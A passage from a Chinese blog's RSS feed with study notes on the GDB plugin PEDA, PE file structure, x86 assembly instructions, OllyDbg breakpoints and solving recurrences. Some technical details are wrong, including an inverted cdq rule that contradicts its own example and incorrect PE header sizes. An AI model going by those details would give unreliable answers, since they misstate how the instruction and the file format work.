GDB。它提供了很多人性化的功能，比如高亮显示反汇编代码、寄存器、内存信息，提高了debug的效率。同时，PEDA还为GDB添加了一些实用新的命令，比如checksec可以查看程序开启了哪些安全机制等等</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install peda</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/gdb/">gdb</category>
      
      
      <comments>https://xchens.cn/posts/8dd7a186/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PE文件分析</title>
      <link>https://xchens.cn/posts/d6ad7f4e/</link>
      <guid>https://xchens.cn/posts/d6ad7f4e/</guid>
      <pubDate>Tue, 13 Nov 2018 10:47:00 GMT</pubDate>
      
      <description>pe文件结构组成分析介绍</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p>dos头：共64字节，前两个字节固定是4D5A，最后4个字节指向PE头。</p><p>dos存根： 无用。</p><p>PE头：4字节PE标识符，20字节的PE文件头，224字节的PE可选头。</p><p>节表：40字节，在PE文件头里已经定义好了节表数目(WORD NumberOfSections;)。</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><p>为了兼容dos系统而遗留。</p><h3 id="MZ头部"><a href="#MZ头部" class="headerlink" title="MZ头部"></a>MZ头部</h3><p>这也是真正的dos头，mz头部只是dos头的别名。<br>(PE内称的dos头往往包括dos存根，实际的dos程序的dos头只是当前这个头)  </p><p>dos头的最后给出了PE头的位置(e_lfanew)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER = <span class="punctuation">&#123;</span></span><br><span class="line">    e_magic<span class="punctuation">:</span> <span class="string">&quot;4D 5A&quot;</span><span class="punctuation">,</span> <span class="comment">// MZ头标识</span></span><br><span class="line">    e_lfanew<span class="punctuation">:</span> <span class="string">&quot;40 00 00 00&quot;</span> <span class="comment">// 指向PE标识符的偏移</span></span><br><span class="line"><span class="punctuation">&#125;</span> <span class="comment">// 64字节 0x40</span></span><br></pre></td></tr></table></figure><h3 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h3><p>仅用于在exe执行与dos中时给出友好提示信息。(没用)</p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><p>真正的windows程序的头部。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS = <span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;PE标识符&#x27;<span class="punctuation">,</span> <span class="comment">// 4字节 0x4</span></span><br><span class="line">    &#x27;文件头IMAGE_FILE_HEADER&#x27;<span class="punctuation">,</span> <span class="comment">// 20字节 0x10</span></span><br><span class="line">    &#x27;可选头IMAGE_OPTIONAL_HEADER&#x27; <span class="comment">// 224字节 0xE0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可选头的最后一项是数据目录。<br>数据目录是一个数组，每一项包括两个字段，共20字节，分别是数据目录项的VitualAddress(实际上是RVA)和size</p><p>该头部分为32位和64位两个版本，其定义取决于是否定义了_WIN64宏。</p><p>如IMAGE_NT_HEADERS32的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span>&#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><p>节表也算作头部的一部分。</p><p>需要多少个节表项，就构造多少节表头(IMAGE_SECTION_HEADER)  </p><p>节表项（节）指 <code>.text .data .idata</code> 这样。</p><p>在之前的IMAGE_OPTIONAL_HEADER中已经指明了SizeOfHeader,根据其字段值在所有节表项（整个头部）的后面填充0补足。</p><h2 id="节数据（程序体）"><a href="#节数据（程序体）" class="headerlink" title="节数据（程序体）"></a>节数据（程序体）</h2><p>指具体的 <code>.text .data .idata</code>的内容，其所占空间大小在节表中定义。</p><h1 id="关于PE"><a href="#关于PE" class="headerlink" title="关于PE"></a>关于PE</h1><p>当文件对齐(FileAlignment)与节对齐(SegmentAlignment)相同时：</p><pre><code>VA - ImageBase = FOA（文件偏移地址） = RVA（相对虚拟地址）</code></pre><p>当二者不同时：</p><pre><code>首先计算RVA=VA-ImageBase判断RVA或FOA所在的节RVA-VOffset == FOA - ROffset</code></pre><p>总之就是无论什么情况下，节中的地址相对于节起始的偏移是不变的。</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入表描述符</span></span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="string">&quot;OriginalFirstThunk&quot;</span><span class="punctuation">,</span> <span class="comment">// 指向IMAGE_THUNK_DATA</span></span><br><span class="line">    <span class="string">&quot;TimeDataStamp&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ForwarderChain&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;Name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;FirstThunk&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">IMAGE_THUNK_DATA = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//保存的是导入函数的序号或者指向导入函数名称的RVA</span></span><br><span class="line">    uinon = <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="string">&quot;DWORD ForwardString&quot;</span><span class="punctuation">,</span>  <span class="comment">// PBYTE</span></span><br><span class="line">        <span class="string">&quot;DWORD Function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;DWORD Ordinal&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;DWORD AddressOfData&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span>u1;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">_IMAGE_IMPORT_BY_NAME = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="string">&quot;WORD Hint&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;BYTE NAME[1]&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/pe/">pe</category>
      
      
      <comments>https://xchens.cn/posts/d6ad7f4e/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>汇编笔记</title>
      <link>https://xchens.cn/posts/c517333d/</link>
      <guid>https://xchens.cn/posts/c517333d/</guid>
      <pubDate>Mon, 12 Nov 2018 05:56:00 GMT</pubDate>
      
      <description>系统底层的学习记录</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="基本寄存器-8086"><a href="#基本寄存器-8086" class="headerlink" title="基本寄存器(8086)"></a>基本寄存器(8086)</h2><p>1:数据寄存器,一般称之为通用寄存器组</p><pre><code>8086 有8个8位数据寄存器这些8位寄存器可分别组成16位寄存器：AH&amp;AL＝AX：累加寄存器，常用于运算；BH&amp;BL＝BX：基址寄存器，常用于地址索引；CH&amp;CL＝CX：计数寄存器，常用于计数；DH&amp;DL＝DX：数据寄存器，常用于数据传递。</code></pre><p>2:地址寄存器&#x2F;段地址寄存器</p><pre><code>为了运用所有的内存空间，8086设定了四个段寄存器，专门用来保存段地址：CS（Code Segment）：代码段寄存器DS（Data Segment）：数据段寄存器SS（Stack Segment）：堆栈段寄存器ES（Extra Segment）：附加段寄存器</code></pre><p>3：特殊功能的寄存器</p><pre><code>IP（Instruction Pointer）：指令指针寄存器，与CS配合使用，可跟踪程序的执行过程SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置SI（Source Index）：源变址寄存器可用来存放相对于DS段之源变址指针DI（Destination Index）：目的变址寄存器，可用来存放相对于 ES 段之目的变址指针。</code></pre><h2 id="关于栈"><a href="#关于栈" class="headerlink" title="关于栈"></a>关于栈</h2><p>ESP: 栈指针寄存器(extended stack pointer) - 指向系统栈最上面一个栈帧的顶部（也是整个栈的顶部）<br>EBP: 基址指针寄存器(extended base pointer) - 指向系统栈最上面一个栈帧的底部<br>ESP与EBP之间的内存空间为当前栈帧。</p><p>EIP: 指令寄存器(extended instruction pointer) - 存放一个指针，指向等待执行的指令地址。</p><h2 id="不常用指令"><a href="#不常用指令" class="headerlink" title="不常用指令"></a>不常用指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">CLD         ;clear flag DF</span><br><span class="line">pushf       ;将标志寄存器的值压栈</span><br><span class="line">popf        ;从栈中弹出数据，送入标志寄存器中。</span><br><span class="line"></span><br><span class="line">pushad      ;将所有寄存器压栈，执行后ESP=ESP-32（32位下）</span><br><span class="line">            ;压栈顺序为EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI</span><br><span class="line">popad       ;对应pushad</span><br><span class="line"></span><br><span class="line">lodsb       ;将esi指向的地址处的数据取出来赋给AL寄存器</span><br><span class="line">            ;然后esi=esi+1</span><br><span class="line">lodsw       ;与lodsb类似，操作的是字，赋值给AX</span><br><span class="line">lodsd       ;同上，赋值给EAX</span><br><span class="line">stosb       ;将AL寄存器的值取出来赋给edi所指向的地址处。</span><br><span class="line">            ;即mov [edi]，AL与edi=edi+1</span><br><span class="line">stosw       ;</span><br><span class="line">stosd       ;</span><br><span class="line">;这一组指令操控的是esi与edi</span><br><span class="line"></span><br><span class="line">cdq         ;Convert Double to Quad</span><br><span class="line">            ;将双字数据扩展到四字</span><br><span class="line">            ;将EAX的最高位拷贝到EDX的每一位</span><br><span class="line">            ;如果EAX&lt;0x8000_0000,EDX=0xFFFF_FFFF</span><br><span class="line">            ;否则EDX=0x0000_0000</span><br><span class="line">            ;如EAX存储-5即EAX=0xFFFF_FFFB</span><br><span class="line">            ;则EDX=0xFFFF_FFFF</span><br><span class="line">            ;两个寄存器合在一起就可以表示一个64位数</span><br><span class="line"></span><br><span class="line">movsx       ;先符号扩展再传送</span><br><span class="line">            ;对于正数而言，符号扩展等于零扩展</span><br><span class="line">            ;对于负数而言，将一个内存较小的值扩展到较大的内存里</span><br><span class="line">            ;需要保留符号位，所以高位全部赋1</span><br><span class="line">movzx       ;先零扩展再传送</span><br><span class="line">            ;低位直接拷贝，高位部分赋0</span><br><span class="line"></span><br><span class="line">Enter       ;相当于push ebp和mov ebp,esp  常用于函数开始处</span><br><span class="line">Leave       ;相当于mov esp,ebp和pop ebp  常用于函数结束处</span><br></pre></td></tr></table></figure><h2 id="跳转相关指令"><a href="#跳转相关指令" class="headerlink" title="跳转相关指令"></a>跳转相关指令</h2><p>1.无条件跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp         ;无条件跳转</span><br></pre></td></tr></table></figure><p>2.根据CX、ECX寄存器的值进行跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JCXZ        ;CX 为 0 则跳转</span><br><span class="line">JECXZ       ;ECX 为 0 则跳转</span><br></pre></td></tr></table></figure><p>3.根据标志位进行跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">JE          ;等于则跳转</span><br><span class="line">JNE         ;不等于则跳转</span><br><span class="line"></span><br><span class="line">JZ          ;为 0 则跳转</span><br><span class="line">JNZ         ;不为 0 则跳转</span><br><span class="line"></span><br><span class="line">JS          ;为负则跳转</span><br><span class="line">JNS         ;不为负则跳转</span><br><span class="line"></span><br><span class="line">JC          ;进位则跳转</span><br><span class="line">JNC         ;不进位则跳转</span><br><span class="line"></span><br><span class="line">JO          ;溢出则跳转</span><br><span class="line">JNO         ;不溢出则跳转</span><br><span class="line"></span><br><span class="line">JA          ;无符号大于则跳转</span><br><span class="line">JNA         ;无符号不大于则跳转</span><br><span class="line">JAE         ;无符号大于等于则跳转</span><br><span class="line">JNAE        ;无符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JG          ;有符号大于则跳转</span><br><span class="line">JNG         ;有符号不大于则跳转</span><br><span class="line">JGE         ;有符号大于等于则跳转</span><br><span class="line">JNGE        ;有符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JB          ;无符号小于则跳转</span><br><span class="line">JNB         ;无符号不小于则跳转</span><br><span class="line">JBE         ;无符号小于等于则跳转</span><br><span class="line">JNBE        ;无符号不小于等于则跳转</span><br><span class="line"></span><br><span class="line">JL          ;有符号小于则跳转</span><br><span class="line">JNL         ;有符号不小于则跳转</span><br><span class="line">JLE         ;有符号小于等于则跳转</span><br><span class="line">JNLE        ;有符号不小于等于则跳转</span><br><span class="line"></span><br><span class="line">JP          ;奇偶位置位则跳转</span><br><span class="line">JNP         ;奇偶位清除则跳转</span><br><span class="line">JPE         ;奇偶位相等则跳转</span><br><span class="line">JPO         ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>文件偏移地址 &#x3D; 虚拟内存地址(VA)-装载基址(Image Base)-节偏移</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E6%B1%87%E7%BC%96/">汇编</category>
      
      
      <comments>https://xchens.cn/posts/c517333d/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>olldbg 手册</title>
      <link>https://xchens.cn/posts/8e260842/</link>
      <guid>https://xchens.cn/posts/8e260842/</guid>
      <pubDate>Mon, 12 Nov 2018 04:48:00 GMT</pubDate>
      
      <description>介绍od常用命令，快捷键，调试知识点等</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="ollydbg快捷键："><a href="#ollydbg快捷键：" class="headerlink" title="ollydbg快捷键："></a>ollydbg快捷键：</h1><p>F2——下断点，也就是指定断点的地址；</p><p>F3——加载一个可执行程序，进行调试分析；</p><p>F4——程序执行到光标处；</p><p>F5——缩小还原当前窗口；</p><p>F7——单步步入；</p><p>F8——单步步过；（Ctrl+F8可以自动步过并设置断点）</p><p>F9——直接运行程序，遇到断点处，程序暂停；</p><p>Ctrl+F2——重新运行程序到起始处，一般用于重新调试程序；</p><p>Ctrl+F9——执行到函数返回处，用于跳出函数实现；</p><p>Alt+F9——执行到用户代码处，用于快速跳出系统函数；</p><p>Ctrl+G——输入十六进制地址，快速定位到该地址处；</p><p>Ctrl+F——查找命令</p><p>Ctrl+S——查找命令序列(通过any(命令)和r32(32位寄存器)实现模糊查找)</p><p>Ctrl+B——查找二进制串(使用?作为模糊查找)</p><p>在遇到call或jmp指令时按下Enter键，可以去其目标地址查看，但暂不直接进入执行(静态查看)</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h3><p>最为常用的普通断点。分为普通操作（鼠标点击设置断点）和命令操作。</p><p>命令操作：bp创建断点，bc删除断点，可以指定api函数并设置偏移量。<br>如 <code>bp CreateFileA</code> 以及 <code>bp CreateFile + 5</code></p><p>note:</p><ol><li>软件断点只能在代码上设置。</li><li>软件断点可以在代码的任意位置上设置，并且断点的数量不受限制。</li></ol><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>硬件断点依赖CPU中的调试寄存器。调试寄存器一共有8个，其中4个用于设置断点，因此断点数量只有4个。  </p><p>硬件断点可以用右键菜单也可以用命令进行设置。</p><ol><li><p>菜单操作</p><p> 在CPU的反汇编窗口或数据窗口单击鼠标右键，在弹出菜单内找到”断点”菜单项可以看到相应的设置硬件断点的子菜单项。<br> 断点类型分为 硬件访问、硬件写入、硬件执行</p></li><li><p>命令操作</p><p> 分为HE, HW, HR, HD。<br> 其中HE表示硬件执行断点，HW和HR分别表示硬件写和硬件读断点。<br> HD表示删除断点。</p></li></ol><h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>获知某块内存中的数据是在什么情况下被写入或访问的。</p><p>在反汇编窗口或数据窗口中单击鼠标右键，在弹出的菜单项里选择”断点”。<br>内存断点分为 <strong>内存访问</strong> 与 <strong>内存写入</strong> 两种方式。</p><p>在内存窗口(按Alt + M可以切换到内存窗口)选择某个内存块，单击鼠标右键，在弹出的菜单中可以进行设置”设置内存访问窗口”，”设置内存写入断点”。</p><p>note: OD只可以设置一个内存断点，再设置新的内存断点时会自动删除之前的内存断点。</p><h3 id="一次性内存访问断点"><a href="#一次性内存访问断点" class="headerlink" title="一次性内存访问断点"></a>一次性内存访问断点</h3><p>类似与内存断点，区别在于在中断后会自行删除</p><h3 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h3><h4 id="1-条件断点"><a href="#1-条件断点" class="headerlink" title="1.条件断点"></a>1.条件断点</h4><p>在需要设置条件断点的位置按下 <strong>shift + F2</strong> ，在弹出的条件对话框中输入条件。也可以在命令插件中直接输入条件，两者的方式是类似的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+, -, &amp;&amp;, ||, !, &gt;, &gt;=, &lt;, &lt;=, ==, !=</span><br></pre></td></tr></table></figure><p>条件示例</p><blockquote><p>EAX &#x3D;&#x3D; 12345678  表示EAX寄存器等于12345678<br>[EAX] &#x3D;&#x3D; 12345678  表示EAX寄存器中保存的值是一个内存地址，内存地址中的值等于12345678<br>[[EAX]] &#x3D;&#x3D; 12345678  表示EAX中内存地址指向的内存地址的值是12345678<br>ESI&#x3D;&#x3D;0040300 &amp;&amp; EDI&#x3D;&#x3D;00403010  表示ESI寄存器的值为0040300且EDI寄存器的值为00403010<br>[403000] !&#x3D; 10  表示内存地址403000的值不等于10<br>STRING[403010] &#x3D;&#x3D; “test”  表示以地址403010为起始地址，以NULL作为结尾的ASCII字符串<br>[STRING[403010]] &#x3D;&#x3D; “test”  表示以地址403010作为起始地址，开头为test的字符串</p></blockquote><p>如命令 bp LoadLibrary [STRING[esp+4]]&#x3D;&#x3D;”kernel32.dll”</p><h4 id="2-条件记录断点"><a href="#2-条件记录断点" class="headerlink" title="2.条件记录断点"></a>2.条件记录断点</h4><p>在需要设置条件记录断点的地址上按下 “shift+F4”。会弹出条件记录断点的对话框。</p><h3 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h3><p>用于调试带有窗口的应用程序。</p><p>消息断点在”window窗口”中设置(单击工具栏上的”W”按钮即可切换到window窗口)。当切换到window窗口后，首先单击右键弹出菜单中的刷新按钮，便于能正常显示所有的窗口。选中要设置断点的窗口记录，然后在右键弹出的菜单当中，选择”在CLassProc设置消息断点”</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E5%B7%A5%E5%85%B7/">工具</category>
      
      <category domain="https://xchens.cn/tags/olldbg/">olldbg</category>
      
      
      <comments>https://xchens.cn/posts/8e260842/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>求解递归式的基本方法</title>
      <link>https://xchens.cn/posts/2d3132fd/</link>
      <guid>https://xchens.cn/posts/2d3132fd/</guid>
      <pubDate>Wed, 07 Nov 2018 15:06:00 GMT</pubDate>
      
      <description>递归式的一般解法</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="递归式"><a href="#递归式" class="headerlink" title="递归式"></a>递归式</h1><p>一个递归式就是一个等式或不等式，<br>它通过更小的输入上的函数值来描述一个函数。<br>例如:<br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp.png" alt="递归式样例"></p><h2 id="一、代入法"><a href="#一、代入法" class="headerlink" title="一、代入法"></a>一、代入法</h2><ol><li><p>猜测解的形式。  </p></li><li><p>用数学归纳法求出解中的常数，并证明解是正确的。</p></li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="一般解法"><a href="#一般解法" class="headerlink" title="一般解法"></a>一般解法</h4><p>求解: T(n) &#x3D; T(n-1) + n  </p><pre><code>假设其解为O(n^2)，即 T(n) = O(n^2)代入法要求: 证明选择常数 c&gt;0 ，可得 T(n) ≤ c*n^2    假设对于 m&lt;n ，总有 T(m) ≤ c*m^2    即 T(n-1) ≤ c*(n-1)^2    那么    T(n) ≤ c*(n-1)^2 + n        ≤ c*n^2 - c*2n + c + n        ≤ c*n^2 - (c*2n - c -n)        ≤ c*n^2 - ((n-1)c + (c-1)n)    由于 n&gt;1 &amp;&amp; c&gt;0 则 ((n-1)c + (c-1)n) &gt; 0    故 T(n) ≤ c*n^2    得 T(n) = O(n^2)</code></pre><h4 id="变形的换元解法"><a href="#变形的换元解法" class="headerlink" title="变形的换元解法"></a>变形的换元解法</h4><p>求解： <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp2.png" alt="递归式换元题"></p><pre><code>这里可以假设n开方后是整数。令 m=lgn得到    T(2^m) = 2T(2^(m/2)) + m使 S(m) = T(2^m), 则    S(m) = 2S(m/2) + m这里的递归式S(m)就可以使用与上面相同的解法。    猜测 S(m) = O(mlgm)， 即存在常数c&gt;0,可得 S(m) ≤ cmlgm    假设c&gt;0时对于任意的 a&lt;m 都有S(a) ≤ calga    则 S(m/2) ≤ c(m/2)lg(m/2)    S(m) ≤ 2c(m/2)lg(m/2) + m         ≤ cmlgm - m(c-1)         ≤ cmlgm    所以 S(m) = O(mlgm)T(n)=T(2^m)=S(m)=O(mlgm)=O(lgn*lglgn)</code></pre><h2 id="二、递归树法"><a href="#二、递归树法" class="headerlink" title="二、递归树法"></a>二、递归树法</h2><p>虽然可以用代入法简洁的证明一个解是递归式的正确解，但想出一个好的猜测可能并不容易。画出递归树是设计好的猜测的一种简单而直接的方法。</p><p>在递归树中，每个结点代表一个单一子问题的代价，子问题对应某次递归函数调用。我们将树中每层中的代价求和，得到每层代价。再将所有层中的代价求和，得到递归调用总代价。</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>我们以<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp3.png" alt="递归式3">为例。<br>如下图显示了构造递归树的必要步骤，为方便起见，假定n是4的幂。</p><p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dgs_abc.png" alt="abc"><br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dgs_d.png" alt="d">  </p><p>递归树法存在一定误差，需要注意</p><h2 id="三、主方法"><a href="#三、主方法" class="headerlink" title="三、主方法"></a>三、主方法</h2><p>主方法为如下形式的递归式提供了特别的解法<br>    ** T(n) &#x3D; aT(n&#x2F;b) + f(n) **<br>其中a,b是常数， a≥1, b&gt;1,f(n)是渐近正函数</p><p>主方法依赖这些<a href="https://zh.wikipedia.org/wiki/%E4%B8%BB%E5%AE%9A%E7%90%86">定理</a></p><h3 id="主方法概括"><a href="#主方法概括" class="headerlink" title="主方法概括"></a>主方法概括</h3><p>比较 <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> 和 f(n)，如果f(n)的复杂度较大，T(n)&#x3D;O(f(n)),如果f(n)的复杂度较小，则T(n)&#x3D;O(<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba">)。<br>而若二者相等，则T(n)&#x3D;O(<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> * lgn)</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><blockquote><p>T(n) &#x3D; 7T(n&#x2F;2) + O(n^2)</p></blockquote><p>这里有a&#x3D;7,b&#x3D;2,f(n)&#x3D;n^2。<br>因此 <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> &gt; f(n)<br>则 T(n) &#x3D; O(n ^ (lg 7))</p><h2 id="the-end"><a href="#the-end" class="headerlink" title="the end"></a>the end</h2><p>欢迎友善交流。</p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E7%AE%97%E6%B3%95/">算法</category>
      
      
      <comments>https://xchens.cn/posts/2d3132fd/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
